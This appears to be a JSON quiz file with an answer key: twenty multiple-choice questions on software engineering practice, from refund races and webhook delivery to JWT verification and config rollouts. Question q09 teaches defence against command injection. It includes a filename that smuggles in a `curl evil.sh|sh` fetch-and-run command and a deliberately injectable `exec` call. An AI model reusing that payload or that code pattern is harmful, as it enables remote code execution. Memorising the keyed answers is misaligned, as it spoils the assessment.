@@ -1,0 +1,673 @@
+{
+  "topic": "code-practices",
+  "variant": 5,
+  "of": 5,
+  "title": "Code practices at scale — variant 5",
+  "description": "Streaks across zones, concurrent refunds, internal endpoints, unknown fields, outgoing webhooks, PUT semantics, error causes, API sunsets, shell injection, JWT checks, tenant ids, keys in apps, heartbeats, histograms, mocks of the code under test and config rollouts.",
+  "minutes": 30,
+  "pass": 0.7,
+  "scaled": false,
+  "domains": [
+    {
+      "id": "edges",
+      "name": "Edges: validation, money and time",
+      "weight": 0.2
+    },
+    {
+      "id": "api",
+      "name": "API design, idempotency and error surfacing",
+      "weight": 0.2
+    },
+    {
+      "id": "security",
+      "name": "Security defaults: authz, injection, SSRF, secrets",
+      "weight": 0.2
+    },
+    {
+      "id": "observability",
+      "name": "Observability: logs, metrics, traces, SLOs",
+      "weight": 0.15
+    },
+    {
+      "id": "testing",
+      "name": "Testing strategy and reviewing AI-written code",
+      "weight": 0.15
+    },
+    {
+      "id": "deploys",
+      "name": "Safe deploys: flags, migrations, canaries, rollbacks",
+      "weight": 0.1
+    }
+  ],
+  "questions": [
+    {
+      "id": "code-practices-v5-q01",
+      "domain": "edges",
+      "stem": "A fitness app rewards 'workout streaks' (a workout on every calendar day) with paid perks, so client-reported dates cannot be trusted. Workouts are stored as UTC instants and streaks are computed on UTC days; Sydney users lose streaks for evening workouts. Many users travel. Which design is right?",
+      "options": [
+        {
+          "text": "Compute days in the zone currently set on the user's profile, so the latest preference always applies.",
+          "correct": false,
+          "why": "When a user moves or travels, every past workout is re-bucketed into the new zone, which can break or create old streaks retroactively."
+        },
+        {
+          "text": "Store each workout's instant with the zone the user was in, and compute its day in that zone.",
+          "correct": true,
+          "why": "Each workout keeps the calendar day it had where it happened, and the server, not the client, derives the date from a trusted instant."
+        },
+        {
+          "text": "Have the app send its local date string with each workout and use that string as the streak day.",
+          "correct": false,
+          "why": "Simple and zone-correct, but the client controls it, so changing the phone's clock farms paid perks."
+        },
+        {
+          "text": "Keep UTC days but give every user a four-hour grace window around midnight UTC.",
+          "correct": false,
+          "why": "Sydney is ten or eleven hours ahead, so four hours does not cover it, and the grace window lets others double-count days."
+        }
+      ],
+      "explain": "A 'day' belongs to a place. Keep the instant for ordering and store the zone that gave it meaning at the time, then derive calendar days per event; recomputing history in today's zone rewrites the past.",
+      "refs": [
+        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Intl/DateTimeFormat/DateTimeFormat"
+      ]
+    },
+    {
+      "id": "code-practices-v5-q02",
+      "domain": "edges",
+      "stem": "An order captured €100.00. Support agents and an automated returns service issue partial refunds at the same time, and refunds can go to store credit, which never touches the payment provider. One order ended up with €130.00 refunded. What design prevents this?",
+      "options": [
+        {
+          "text": "Before each refund, sum the existing refunds in application code and reject the new one if the total would exceed the capture.",
+          "correct": false,
+          "why": "Two concurrent refunds each read the old sum and both pass; the check and the write are not atomic."
+        },
+        {
+          "text": "Let the payment provider reject over-refunds, since it knows exactly how much was captured.",
+          "correct": false,
+          "why": "Store-credit refunds never reach the provider, so it cannot see or block them."
+        },
+        {
+          "text": "Run a nightly reconciliation job that flags orders whose refunds exceed the captured amount.",
+          "correct": false,
+          "why": "It finds the problem after the money or credit has already been given away."
+        },
+        {
+          "text": "Atomically enforce `refunded + new <= captured` in minor units (row lock or conditional update).",
+          "correct": true,
+          "why": "The database serialises competing refunds on the payment row, so the invariant holds no matter which channel issues them."
+        }
+      ],
+      "explain": "Money invariants under concurrency must be enforced atomically where the data lives: a row lock, a conditional `UPDATE … WHERE refunded + $1 <= captured`, or a constraint. Application-side check-then-act loses races.",
+      "refs": [
+        "https://www.postgresql.org/docs/current/explicit-locking.html"
+      ]
+    },
+    {
+      "id": "code-practices-v5-q03",
+      "domain": "edges",
+      "stem": "`POST /internal/credits` is called by six internal services and skips input validation because it is 'internal and trusted'. Last week one caller sent a negative amount, and another sent `\"100\"` as a string, which the handler concatenated into a balance of `\"0100\"`. What should change?",
+      "options": [
+        {
+          "text": "Make each of the six calling services responsible for validating the payload before sending it.",
+          "correct": false,
+          "why": "Six places to keep in sync, and the next caller or bug still reaches the endpoint unchecked."
+        },
+        {
+          "text": "Rely on network policy so that only the six known services can reach the endpoint at all.",
+          "correct": false,
+          "why": "It controls who can call, not what they send; both bad payloads came from allowed services."
+        },
+        {
+          "text": "Validate it like a public endpoint (integer minor units, range, currency) and authorize callers per service.",
+          "correct": true,
+          "why": "The receiving boundary is the one place that sees every caller, so validation there protects the balance from any of them."
+        },
+        {
+          "text": "Publish a shared TypeScript types package that all six callers must import when they build the request body they send.",
+          "correct": false,
+          "why": "Types vanish at runtime; JSON on the wire can still carry strings and negative numbers."
+        }
+      ],
+      "explain": "Validate at every boundary you own, including internal ones: 'trusted' callers have bugs too. Schema-check payloads on receipt and authenticate and authorize each calling service separately.",
+      "refs": [
+        "https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html"
+      ]
+    },
+    {
+      "id": "code-practices-v5-q04",
+      "domain": "edges",
+      "stem": "A shipping API ignores unknown JSON fields on `POST /shipments`. A partner sent `insuredValue` instead of the documented `insured_value` for three months; every shipment went out uninsured, and a €40k claim was denied. What should the API do on write endpoints like this?",
+      "options": [
+        {
+          "text": "Reject unknown fields with a 400 that names them, and add new fields to the schema additively.",
+          "correct": true,
+          "why": "A typo becomes an immediate, visible error on the first request instead of a silent loss months later."
+        },
+        {
+          "text": "Accept both `insured_value` and `insuredValue` from now on, since partners clearly find the camelCase name natural.",
+          "correct": false,
+          "why": "It fixes one spelling; the next typo or naming variant is ignored just as silently."
+        },
+        {
+          "text": "Log unknown fields on the server and review the logs every month for patterns that look like partner mistakes.",
+          "correct": false,
+          "why": "Nobody connects a log line to a partner's lost insurance in time; the API still returns success."
+        },
+        {
+          "text": "Make `insured_value` a required field on every shipment request.",
+          "correct": false,
+          "why": "Many shipments legitimately have no insurance, so this breaks valid requests to catch one typo."
+        }
+      ],
+      "explain": "Be strict about what you accept on writes that carry money or obligations: unknown fields are usually client mistakes, and rejecting them surfaces bugs on day one. Tolerance belongs to readers of responses, not to writers of commands.",
+      "refs": [
+        "https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html"
+      ]
+    },
+    {
+      "id": "code-practices-v5-q05",
+      "domain": "api",
+      "stem": "Your platform sends webhooks to 20k merchant endpoints. Some respond in 30 seconds, and some are down for hours. Today the webhook is sent inline in the API request that caused the event, with three immediate retries, so slow merchants slow your API and outages lose events. What design fits?",
+      "options": [
+        {
+          "text": "Raise the immediate retries to ten and add a short fixed delay between attempts, still inside the request.",
+          "correct": false,
+          "why": "The API gets even slower, and a merchant down for hours still loses every event."
+        },
+        {
+          "text": "Send the webhook from a promise that is not awaited, right after the API responds, so it never slows the request.",
+          "correct": false,
+          "why": "The request is fast again, but a pod restart loses every pending delivery and failures are invisible."
+        },
+        {
+          "text": "Outbox in the same transaction, async workers, backoff with jitter over days, signed payloads with event ids.",
+          "correct": true,
+          "why": "Events are durable from commit, slow merchants only affect their own queue, and receivers can verify and dedupe deliveries."
+        },
+        {
+          "text": "Stop sending webhooks and ask merchants to poll an events endpoint every minute.",
+          "correct": false,
+          "why": "Durable and simple for you, but merchants rely on push, and 20k pollers per minute add constant load and latency."
+        }
+      ],
+      "explain": "Outgoing webhooks are a distributed-delivery problem: make events durable with the state change (outbox), deliver asynchronously with backoff and jitter, isolate slow endpoints, and give receivers signatures and event ids so they can verify and dedupe.",
+      "refs": [
+        "https://docs.stripe.com/webhooks"
+      ]
+    },
+    {
+      "id": "code-practices-v5-q06",
+      "domain": "api",
+      "stem": "`POST /customers/:id/default-card` with `{ cardId }` appends a history row and emits a `default_card.changed` event on every call. Mobile clients retry on timeouts, so customers get duplicate 'your default card changed' emails. You want retries safe without adding client-side state. What design fits?",
+      "options": [
+        {
+          "text": "Require an `Idempotency-Key` on this endpoint and store keys for 24 hours.",
+          "correct": false,
+          "why": "It works, but every client must generate and keep a key per action, which is the client-side state you wanted to avoid."
+        },
+        {
+          "text": "Make it `PUT /customers/:id/default-card` that sets state, emitting the event only when the value changes.",
+          "correct": true,
+          "why": "Setting the same value twice is naturally idempotent, so retries are harmless and no event fires for a no-op."
+        },
+        {
+          "text": "Debounce the notification emails so that at most one goes out per customer in any five-minute period, whatever the cause.",
+          "correct": false,
+          "why": "It hides the symptom in email, but duplicate history rows and events still reach every other consumer."
+        },
+        {
+          "text": "Return 409 when the requested card is already the customer's default card.",
+          "correct": false,
+          "why": "A retry after a lost response now looks like a failure to the client, even though the change succeeded."
+        }
+      ],
+      "explain": "Prefer operations that are idempotent by design: 'set X to Y' (PUT) instead of 'append a change' (POST), and emit events on actual state transitions. Idempotency keys are for operations that cannot be expressed that way.",
+      "refs": [
+        "https://www.rfc-editor.org/rfc/rfc9110.html#name-idempotent-methods"
+      ]
+    },
+    {
+      "id": "code-practices-v5-q07",
+      "domain": "api",
+      "stem": "Logs show `Error: failed to create invoice` and nothing else. The repository code does `catch (e) { throw new Error('failed to create invoice') }`, so on-call cannot tell a unique-key violation (do not retry) from a connection timeout (retry). The invoice job runs 200k times a day. What should the code do?",
+      "options": [
+        {
+          "text": "Log the error at every `catch` on its way up, before rethrowing it, so that no detail about the failure is ever lost.",
+          "correct": false,
+          "why": "Each failure is logged several times at different layers, flooding logs while still not giving callers a typed, retryable signal."
+        },
+        {
+          "text": "Rethrow the original database error unchanged so its full details reach the top.",
+          "correct": false,
+          "why": "The cause survives, but callers lose the domain context and may end up mapping raw driver errors into API responses."
+        },
+        {
+          "text": "Throw a typed `InvoiceError` with `{ cause: e }` and a retryable flag; log the chain once at the boundary.",
+          "correct": true,
+          "why": "Callers branch on a domain type and flag, and the original error is preserved for the single log entry that matters."
+        },
+        {
+          "text": "Catch the error in the repository and return `null` so callers can decide what to do.",
+          "correct": false,
+          "why": "It turns a failure into 'no result', so callers cannot tell failure from absence at all."
+        }
+      ],
+      "explain": "Wrap errors to add meaning, never to erase it: a typed error with `{ cause }` keeps the chain, a retryable property drives behaviour, and logging once at the boundary avoids duplicate noise.",
+      "refs": [
+        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Error/cause"
+      ]
+    },
+    {
+      "id": "code-practices-v5-q08",
+      "domain": "api",
+      "stem": "API v1 is scheduled for removal next month. It was announced by email six months ago, but 600 API keys still call it and nobody knows which customers own them or how critical the calls are. What should the team do?",
+      "options": [
+        {
+          "text": "Remove v1 on the announced date; customers were given six months of notice by email.",
+          "correct": false,
+          "why": "Fair on paper, but 600 active callers will break on the day, many of whom never read the email."
+        },
+        {
+          "text": "Measure usage per key, send `Deprecation` and `Sunset` headers, contact owners, and run brownouts before removal.",
+          "correct": true,
+          "why": "You learn who is affected, machines and humans both get warned, and brownouts surface hidden dependencies while rollback is easy."
+        },
+        {
+          "text": "Keep v1 running indefinitely, since removing any API version is always too risky.",
+          "correct": false,
+          "why": "Every old version adds security and maintenance cost forever."
+        },
+        {
+          "text": "Redirect every v1 request to the matching v2 endpoint with a 301.",
+          "correct": false,
+          "why": "Request and response shapes differ between versions, and many clients do not follow redirects for POSTs."
+        }
+      ],
+      "explain": "Retiring an API is a migration, not a date. Measure who still calls it, warn in-band (`Deprecation`, `Sunset` headers) and out of band, and use scheduled brownouts to flush out unknown dependents before the final removal.",
+      "refs": [
+        "https://www.rfc-editor.org/rfc/rfc8594.html",
+        "https://www.rfc-editor.org/rfc/rfc9745.html"
+      ]
+    },
+    {
+      "id": "code-practices-v5-q09",
+      "domain": "security",
+      "stem": "A thumbnail service handles 2M uploads a day with the code below. A user uploaded a file named `a.png;curl evil.sh|sh;.png`. What is the right fix?",
+      "code": "import { exec } from 'node:child_process';\n\nexport function makeThumb(file: Upload) {\n  const cmd = `convert ${file.originalname} -resize 200x200 out/${file.id}.png`;\n  return new Promise((ok, fail) =>\n    exec(cmd, (err) => (err ? fail(err) : ok(undefined))));\n}",
+      "options": [
+        {
+          "text": "Escape double quotes in `originalname` and wrap it in double quotes inside the command string.",
+          "correct": false,
+          "why": "Inside double quotes the shell still expands `$(…)` and backticks, so injection remains."
+        },
+        {
+          "text": "Save the upload under a server-generated name and call `execFile('convert', [path, …])` with no shell.",
+          "correct": true,
+          "why": "No shell parses the arguments, and the user's filename never reaches the command line at all."
+        },
+        {
+          "text": "Allow only filenames that end in `.png` or `.jpg` before running the command on them.",
+          "correct": false,
+          "why": "The attack filename ends in `.png`, so it passes; the extension says nothing about the characters in between."
+        },
+        {
+          "text": "Wrap the filename in single quotes when building the command so the shell treats it as one literal argument.",
+          "correct": false,
+          "why": "A filename containing a single quote closes the quoting and injects again."
+        }
+      ],
+      "explain": "Never build shell strings from user input. Pass arguments as an array to `execFile` or `spawn` without a shell, and avoid passing user-controlled names at all by generating your own.",
+      "refs": [
+        "https://nodejs.org/api/child_process.html#child_processexecfilefile-args-options-callback",
+        "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html"
+      ]
+    },
+    {
+      "id": "code-practices-v5-q10",
+      "domain": "security",
+      "stem": "Twelve microservices sit behind a gateway that validates JWTs. One service uses `jwt.decode()` to read `sub` and roles 'because the gateway already verified it', and its pods turned out to be reachable directly from another namespace. Traffic is 20k rps, and the team won't add a network call to the identity provider per request. What should the service do?",
+      "options": [
+        {
+          "text": "Verify each token itself: signature with a pinned algorithm and JWKS key, plus `exp`, `iss` and `aud`.",
+          "correct": true,
+          "why": "Local verification is cheap with cached keys, and it makes the service safe whether or not the gateway was in the path."
+        },
+        {
+          "text": "After decoding, check that `exp` is still in the future before trusting the `sub` and role claims carried in the token.",
+          "correct": false,
+          "why": "Anyone can mint an unexpired token with any roles; without a signature check the claims mean nothing."
+        },
+        {
+          "text": "Verify the signature using whichever algorithm the token's own `alg` header names.",
+          "correct": false,
+          "why": "Letting the token choose the algorithm enables `none` and key-confusion attacks; the algorithm must be fixed by the server."
+        },
+        {
+          "text": "Call the identity provider's introspection endpoint for every incoming request.",
+          "correct": false,
+          "why": "It would be secure, but the stem rules out a per-request network call: at 20k rps it adds a hop to every request and makes the identity provider a hard dependency."
+        }
+      ],
+      "explain": "Each service that makes authorization decisions should verify the credentials it acts on: signature with a server-chosen algorithm and key, expiry, issuer and audience. Network position is defence in depth, not authentication.",
+      "refs": [
+        "https://www.rfc-editor.org/rfc/rfc8725.html"
+      ]
+    },
+    {
+      "id": "code-practices-v5-q11",
+      "domain": "security",
+      "stem": "In a multi-tenant project-management SaaS, an AI-generated handler for `POST /projects` takes `{ tenantId, name }` from the body and inserts the project with that `tenantId`. A tester created projects inside another company's workspace. What is the fix?",
+      "options": [
+        {
+          "text": "Validate that `tenantId` in the body is a well-formed UUID before inserting the project.",
+          "correct": false,
+          "why": "Another tenant's id is a perfectly valid UUID; format checks are not authorization."
+        },
+        {
+          "text": "Check that the tenant named in the body exists in the tenants table and is active before creating the project for it.",
+          "correct": false,
+          "why": "The other company's tenant exists; existence says nothing about whether the caller belongs to it."
+        },
+        {
+          "text": "Hide the tenant selector in the web UI so that users cannot pick a different tenant.",
+          "correct": false,
+          "why": "The API still accepts any `tenantId`, so a direct request bypasses the UI."
+        },
+        {
+          "text": "Take `tenantId` from the authenticated session, ignore or reject the body's, and scope every query by it.",
+          "correct": true,
+          "why": "Tenant identity comes from what the server verified, never from what the client claims."
+        }
+      ],
+      "explain": "Identity and tenancy come from authenticated context, never from request parameters. Any id in a body or URL that crosses a tenant boundary must be checked against the caller's verified tenant.",
+      "refs": [
+        "https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html"
+      ]
+    },
+    {
+      "id": "code-practices-v5-q12",
+      "domain": "security",
+      "stem": "A mobile app ships with API keys for a paid LLM API and for an SMS provider embedded in the binary, so it can call both directly. Last weekend someone extracted the keys and ran up $40k in usage. Which two changes are right? (Choose two.)",
+      "options": [
+        {
+          "text": "Put the paid calls behind your backend, which holds the keys and enforces per-user auth, quotas and rate limits.",
+          "correct": true,
+          "why": "Keys stay on servers you control, and every call is tied to an authenticated user with limits."
+        },
+        {
+          "text": "Rotate both keys now, and treat anything shipped inside an app binary as public from here on.",
+          "correct": true,
+          "why": "The extracted keys still work until rotated, and no client-side secret survives a determined user."
+        },
+        {
+          "text": "Obfuscate the keys in the binary with string encryption.",
+          "correct": false,
+          "why": "The app must decrypt them to use them, so they can be pulled from memory or traffic."
+        },
+        {
+          "text": "Fetch the keys from your config service at first launch and store them in the iOS Keychain.",
+          "correct": false,
+          "why": "The key still ends up on a device the user controls; Keychain protects against other apps, not the device's owner."
+        },
+        {
+          "text": "Add certificate pinning so that the app only talks to the real provider endpoints.",
+          "correct": false,
+          "why": "Pinning protects your app's traffic; the attacker just uses the extracted key from their own client."
+        }
+      ],
+      "explain": "Anything shipped to a client is public. Keep paid or privileged credentials on the server, proxy through an API that authenticates users and enforces quotas, and rotate any key that was ever embedded.",
+      "refs": [
+        "https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html"
+      ]
+    },
+    {
+      "id": "code-practices-v5-q13",
+      "domain": "observability",
+      "stem": "A nightly settlement job runs as a Kubernetes CronJob. After a namespace migration it silently stopped being scheduled for four days. No errors were logged and no alerts fired, because nothing ran. Which signal catches this?",
+      "options": [
+        {
+          "text": "Alert whenever the settlement job writes any error-level log line.",
+          "correct": false,
+          "why": "A job that never starts writes no errors, so the alert stays silent the whole time."
+        },
+        {
+          "text": "Add retries with backoff to the job so transient failures do not stop settlement.",
+          "correct": false,
+          "why": "Retries help a job that starts and fails; this one was never scheduled."
+        },
+        {
+          "text": "Alert on the CPU and memory usage of the job's pods during its nightly window.",
+          "correct": false,
+          "why": "No pods existed, so there was nothing to measure and nothing to alert on."
+        },
+        {
+          "text": "Record a last-success timestamp and alert when it is older than the schedule allows.",
+          "correct": true,
+          "why": "Absence of success is what this failure looks like, so a dead man's switch fires however the job fails to run."
+        }
+      ],
+      "explain": "Batch and scheduled work fails by not happening, which error-based alerts never see. Emit a heartbeat or last-success metric on completion and alert on its staleness relative to the expected schedule.",
+      "refs": [
+        "https://sre.google/workbook/monitoring/"
+      ]
+    },
+    {
+      "id": "code-practices-v5-q14",
+      "domain": "observability",
+      "stem": "120 pods expose request latency as a Prometheus summary with p99 computed in each pod. The dashboard averages the per-pod p99s, and the SLO says '99% of requests under 300 ms'. Load across pods is uneven. What should change?",
+      "options": [
+        {
+          "text": "Weight each pod's p99 by its request count before averaging them across the fleet.",
+          "correct": false,
+          "why": "Weighted or not, an average of quantiles is not the quantile of the combined data."
+        },
+        {
+          "text": "Use a histogram with a 300 ms bucket boundary and aggregate bucket counts across pods.",
+          "correct": true,
+          "why": "Histogram buckets add up across pods, so fleet-wide quantiles and 'fraction under 300 ms' come out right."
+        },
+        {
+          "text": "Plot the maximum of the per-pod p99 values instead of the average, as a conservative upper bound for the fleet.",
+          "correct": false,
+          "why": "It is driven by the worst pod and still is not the fleet's p99, so the SLO number is wrong in the other direction."
+        },
+        {
+          "text": "Scrape every 5 seconds instead of every 30 so the quantiles are fresher.",
+          "correct": false,
+          "why": "Fresher wrong numbers are still wrong; scrape frequency does not make quantiles aggregatable."
+        }
+      ],
+      "explain": "Precomputed quantiles cannot be combined across instances. Use histograms (with a bucket at the SLO threshold, or native histograms), sum buckets across the fleet, then compute quantiles or the fraction under the threshold.",
+      "refs": [
+        "https://prometheus.io/docs/practices/histograms/"
+      ]
+    },
+    {
+      "id": "code-practices-v5-q15",
+      "domain": "observability",
+      "stem": "A team owns an internal finance-reporting service that analysts use a few times a week; a failed report can simply be rerun. The team proposes a 99.99% availability SLO 'to match checkout', which would need a multi-region deployment. What should guide the target?",
+      "options": [
+        {
+          "text": "Use 99.99% everywhere so that every service in the company is held to one consistent standard.",
+          "correct": false,
+          "why": "Consistency is not a user need; a four-nines target here costs a multi-region build that analysts do not need."
+        },
+        {
+          "text": "Set no SLO, because internal services do not have external customers.",
+          "correct": false,
+          "why": "Internal users still need a reliability signal, and without one there is no basis for prioritising reliability work."
+        },
+        {
+          "text": "Copy the cloud provider's SLA for the database the service uses.",
+          "correct": false,
+          "why": "The provider's SLA describes their component, not what analysts need from your service."
+        },
+        {
+          "text": "What users need: e.g. 99.5% in business hours plus a data-freshness SLI, and spend the saved effort elsewhere.",
+          "correct": true,
+          "why": "The target matches how the service is actually used, and each extra nine is only bought when users would notice it."
+        }
+      ],
+      "explain": "SLOs come from user needs, not prestige: each extra nine multiplies cost. Pick SLIs that reflect what users care about (availability during use, freshness, correctness) and a target just high enough to keep them happy.",
+      "refs": [
+        "https://sre.google/sre-book/service-level-objectives/"
+      ]
+    },
+    {
+      "id": "code-practices-v5-q16",
+      "domain": "testing",
+      "stem": "An HTTP client library retries with exponential backoff (200 ms doubling, capped at 30 s, at most 6 attempts) and honours `Retry-After`. Its tests use real time and take about 60 seconds. You want fast tests that prove it gives up after 6 attempts and waits the right amounts. What approach?",
+      "options": [
+        {
+          "text": "Set the backoff base to 1 ms through an environment variable in tests so they run quickly.",
+          "correct": false,
+          "why": "Fast, but the real schedule, the 30 s cap and `Retry-After` handling are never exercised."
+        },
+        {
+          "text": "Mock the retry helper so that it returns immediately, and assert only on the final result that the client call produces.",
+          "correct": false,
+          "why": "The logic under test is replaced by the mock, so delays and attempt counts are not tested at all."
+        },
+        {
+          "text": "Run the tests against a real public endpoint that is known to be flaky.",
+          "correct": false,
+          "why": "Nondeterministic: some runs never see a failure and others time out, so the suite proves nothing reliably."
+        },
+        {
+          "text": "Inject the clock (or `t.mock.timers`) and a fake server returning 503s; tick and assert delays and attempts.",
+          "correct": true,
+          "why": "Virtual time makes the full schedule run in milliseconds, and assertions check exactly the delays and attempts specified."
+        }
+      ],
+      "explain": "Time-based behaviour (retries, backoff, TTLs, timeouts) is tested with controlled time, not by shrinking constants or sleeping. Fake the clock and the dependency, then assert on the observable sequence.",
+      "refs": [
+        "https://nodejs.org/api/test.html#class-mocktimers"
+      ]
+    },
+    {
+      "id": "code-practices-v5-q17",
+      "domain": "testing",
+      "stem": "Three hundred end-to-end tests gate every merge, and about 8% of runs fail randomly. The team made CI retry each failed test up to three times. Last week a real race condition merged because its test failed only one run in three. What should the team do?",
+      "options": [
+        {
+          "text": "Raise the retry count to five so random failures almost never block merges.",
+          "correct": false,
+          "why": "More retries hide more real intermittent bugs, which is exactly how the race got in."
+        },
+        {
+          "text": "Track flake rate per test, quarantine flaky tests with an owner and a deadline, and move coverage down to faster levels.",
+          "correct": true,
+          "why": "The gate stays trustworthy, flaky tests get fixed rather than forgotten, and most checks move to faster, deterministic levels."
+        },
+        {
+          "text": "Delete the end-to-end suite and rely only on unit tests.",
+          "correct": false,
+          "why": "Some critical user journeys only fail when everything is wired together, so a small smoke suite is still worth keeping."
+        },
+        {
+          "text": "Run the end-to-end suite only once a night instead of on each merge.",
+          "correct": false,
+          "why": "Flakes remain, and real regressions are now found a day after they merge."
+        }
+      ],
+      "explain": "Automatic retries turn intermittent failures, including real races, into green builds. Measure flakiness per test, quarantine with ownership, and keep the merge gate small, fast and deterministic.",
+      "refs": [
+        "https://martinfowler.com/articles/nonDeterminism.html"
+      ]
+    },
+    {
+      "id": "code-practices-v5-q18",
+      "domain": "testing",
+      "stem": "An agent wrote 40 tests like the one below for a pricing service, reaching 95% coverage. Last week a discount bug reached production unnoticed. What is wrong with these tests, and what should replace them?",
+      "code": "test('applies discount', async () => {\n  const svc = new PricingService(repo);\n  const spy = mock.method(svc, 'computeDiscount', () => 500);\n  const total = await svc.total(cart);\n  assert.equal(spy.mock.callCount(), 1);\n  assert.equal(total, cart.subtotal - 500);\n});",
+      "options": [
+        {
+          "text": "Nothing is wrong: they verify that `total` calls `computeDiscount` and subtracts its result, which is exactly the contract.",
+          "correct": false,
+          "why": "The discount logic is replaced by a stub, so a wrong discount rule can never fail any of these tests."
+        },
+        {
+          "text": "They mock the code under test; fake only boundaries (repo, clock) and assert real totals for real rules and edge carts.",
+          "correct": true,
+          "why": "Real discount logic now runs, so wrong rules or edge cases produce wrong totals and the tests fail."
+        },
+        {
+          "text": "Replace the spy with a full mock of `PricingService` so the test has no dependencies at all.",
+          "correct": false,
+          "why": "That mocks even more of the subject; the test would then check the mock against itself."
+        },
+        {
+          "text": "Add a snapshot assertion of `total` to each test.",
+          "correct": false,
+          "why": "The total is still computed from a stubbed discount, so the snapshot freezes a meaningless value."
+        }
+      ],
+      "explain": "Mock at the edges of the unit, never the logic you are testing. Generated tests often stub the hard part and assert interactions; a good test fails when the behaviour is wrong, whatever the internals look like.",
+      "refs": [
+        "https://testing.googleblog.com/2013/08/testing-on-toilet-test-behavior-not.html"
+      ]
+    },
+    {
+      "id": "code-practices-v5-q19",
+      "domain": "deploys",
+      "stem": "Code deploys go through canaries, but a global rate-limit config is pushed to all 12 regions at once from a central config service. Last month a typo set the limit to 0, and every region rejected all traffic within 40 seconds. What should change?",
+      "options": [
+        {
+          "text": "Require approval from a second engineer for every config change before the config service pushes it out to the regions.",
+          "correct": false,
+          "why": "Reviewers miss typos too, and a mistake that gets through still hits all 12 regions at once."
+        },
+        {
+          "text": "Allow config changes only during business hours, when the most engineers are online.",
+          "correct": false,
+          "why": "More people are watching, but the blast radius is still global and immediate."
+        },
+        {
+          "text": "Validate config against a schema and sanity rules, then roll it out region by region with automatic rollback.",
+          "correct": true,
+          "why": "Obvious errors are rejected before shipping, and anything subtler hits one region and is reverted before it spreads."
+        },
+        {
+          "text": "Cache the last known config in each region for 24 hours.",
+          "correct": false,
+          "why": "A new bad config is still applied everywhere at once; the cache only helps when the config service is unreachable."
+        }
+      ],
+      "explain": "Config is code in production: a bad value can take everything down faster than a bad binary. Give config the same safety as deploys: validation, progressive rollout, health checks and automatic rollback.",
+      "refs": [
+        "https://sre.google/workbook/canarying-releases/"
+      ]
+    },
+    {
+      "id": "code-practices-v5-q20",
+      "domain": "deploys",
+      "stem": "After two years a monolith carries about 900 feature flags. An engineer created a new flag that reused an old key name; that flag was still referenced by a forgotten code path, which switched on and sent emails to 30k deleted users. What practice prevents this?",
+      "options": [
+        {
+          "text": "Hide flags older than a year in the flag service's UI so that engineers stop seeing, and accidentally reusing, their keys.",
+          "correct": false,
+          "why": "The old code path still exists and still reads the key; hiding it in the UI changes nothing in production."
+        },
+        {
+          "text": "Default every flag to off, so that a newly created flag cannot switch anything on by accident.",
+          "correct": false,
+          "why": "The engineer turned the new flag on deliberately; the problem was the old code that also listened to it."
+        },
+        {
+          "text": "Give every flag an owner and expiry, delete it and its dead branch once rolled out, and never reuse keys.",
+          "correct": true,
+          "why": "Removing flags with their code paths leaves nothing stale to wake up, and unique keys prevent accidental coupling."
+        },
+        {
+          "text": "Audit all flags once a year.",
+          "correct": false,
+          "why": "A year is long enough for hundreds of stale flags to pile up; cleanup has to be part of finishing each rollout."
+        }
+      ],
+      "explain": "Feature flags are temporary debt. Every flag needs an owner and an expiry, removal of the flag and its dead code is part of 'done', and keys are never recycled.",
+      "refs": [
+        "https://martinfowler.com/articles/feature-toggles.html"
+      ]
+    }
+  ]
+}
